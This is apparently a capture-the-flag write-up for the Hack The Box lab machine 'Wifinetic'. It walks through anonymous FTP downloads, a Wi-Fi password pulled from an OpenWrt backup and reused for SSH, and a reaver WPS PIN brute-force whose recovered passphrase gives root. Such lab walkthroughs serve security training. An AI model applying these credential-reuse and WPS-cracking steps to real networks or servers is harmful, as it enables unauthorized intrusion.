+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2023-09-16T11:00:00.000Z
publishDate = 2023-09-16T11:00:00.000Z
description = "Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. FTP service has anonymous authentication enabled which allows us to download available files. One of the file being OpenWRT backup which contains Wireless Network configuration that discloses Access Point password. Contents of shadow or passwd files discloses username on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user.. Using standard tools and with the provided wireless interface in monitoring mode we can bruteforce WPS PIN for the Access Point to obtain the PSK. The pass phrase can be reused on SSH service to obtain root access on the server."
summary = ""
draft = false
slug = "hack-the-box-wifinetic"
tags = ["hack the box", "Easy", "Linux", "networking", "wifi", "reaver", "WPA", "Password Reuse", "hostapd"]
title = "Hack the Box - wifinetic"
url = "/hack-the-box-wifinetic"
thumbnail = "/images/wifinetic/logo.png"
+++

Welcome back! Today we are doing the same thing we do every day, try and take over the world! Errr, wait, no, a Capture the Flag. This time it's the Easy Linux machine - Wifinetic. Let's jump in!

I'm not entirely sure what this machine has in store. Are we going to break the wifi connectivity, what's our enumeration method, and what else might be happening here? Let's just start with a standard `rustscan`,  as usual.

```
PORT   STATE SERVICE    REASON  VERSION
21/tcp open  ftp        syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped syn-ack
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Some good ports here! `Anonymous` `ftp` is available as well. We see some `.pdf`'s and interestingly enough a `backup-OpenWrt-2023-07-26.tar`. This is probably our way forward, some sort of packet capture analysis. Let's download everything.

Command:
`ftp 10.129.229.90`
`mget *`

Now we can unzip our `.tar` file.

Command:
`tar -xf backup-OpenWrt-2023-07-26.tar`

Now we see a new `etc` directory was unpacked.

![](/images/wifinetic/wifi1.png)

Now if we dig into some of these files, we can see that `etc/config/wireless` has a password in it!

![](/images/wifinetic/wifi2.png)

Now, that we have a password of `VeRyUniUqWiFIPasswrd1!`. We need the second half of that, a `username`. Now in our `backup` file, we can simply check the `passwd` to see what users are available on the machine.

![](/images/wifinetic/wifi3.png)

Here we see the user of `netadmin`. So, let's try that username password combo on `SSH`.

Sure enough, it works! We're in!

![](/images/wifinetic/user.png)

Now with the `user.txt` flag under our belt, we can continue to enumerate. We copy over `linpeas` and `pspy` to start some enumeration. Our enumeration shows a bunch of wifi networks and many users. The item that could slip by that should be a silver bullet is the inclusion of `reaver` in our system. You wouldn't expect to break `WPS PINS` from the same system, at least not often.

Onboard tools
```
Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

Networks
```
                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                          
                              ╚═════════════════════╝                                                                        
╔══════════╣ Hostname, hosts and DNS
wifinetic                                                                                                                    
127.0.0.1 localhost
127.0.1.1 wifinetic

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                          
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.90  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:46b8  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:46b8  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:46:b8  txqueuelen 1000  (Ethernet)
        RX packets 66717  bytes 5764854 (5.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 66869  bytes 6440995 (6.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 402  bytes 24180 (24.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 402  bytes 24180 (24.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 14264  bytes 2513522 (2.5 MB)
        RX errors 0  dropped 14264  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 476  bytes 45564 (45.5 KB)
        RX errors 0  dropped 65  overruns 0  frame 0
        TX packets 570  bytes 66845 (66.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 150  bytes 20545 (20.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 476  bytes 54132 (54.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      -                                            
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::53                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -           
```

What is generating these networks? Some digging and research shows that the service creating these networks is `[hostapd](https://en.wikipedia.org/wiki/Hostapd)`. So we have a `mon0`, `wlan0`, `wlan1` and `wlan2` networks being created. What's interesting is that `mon0`. This usually represents a network in `[monitoring mode](https://en.wikipedia.org/wiki/Monitor_mode)`. So to get this working we need the `BSSID` of the `wlan` we want to smash on. We can obtain this by running `iwlist scanning`. This will output the information we're looking for:

```
lo        Interface doesn't support scanning.

wlan0     No scan results

wlan2     No scan results

hwsim0    Interface doesn't support scanning.

eth0      Interface doesn't support scanning.

wlan1     Scan completed :
          Cell 01 - Address: 02:00:00:00:00:00
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"OpenWrt"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=0006053db851b269
                    Extra: Last beacon: 25432ms ago
                    IE: Unknown: 00074F70656E577274
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010362DB47BA53A519188FB5458B986B2E41021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120

mon0      No scan results
```

We see the address of `wlan1` as `02:00:00:00:00:00`. There we go, now let's get some `reaver` running.

We'll run `reaver -i mon0 -b 02:00:00:00:00:00 -vv`. The breakdown of the command is fairly simple:

`-i mon0` is for specifying the interface. 
`-b` is for specifying the `BSSID` of the target.
`-vv` is for Very Verbose.

We run it and within a few seconds have our result!

![](/images/wifinetic/wifi4.png)

We have the `WPA PSK` and `PIN` for the `OpenWrt` network. But how does that help us? Well, we know that password reuse was a problem before. So let's see if this password works for the `root` account.

![](images/wifinetic/root.png)

It does and we are in! We snag the `root.txt` flag and the machine is complete! This machine was not what I expected although a great example of Password Reuse.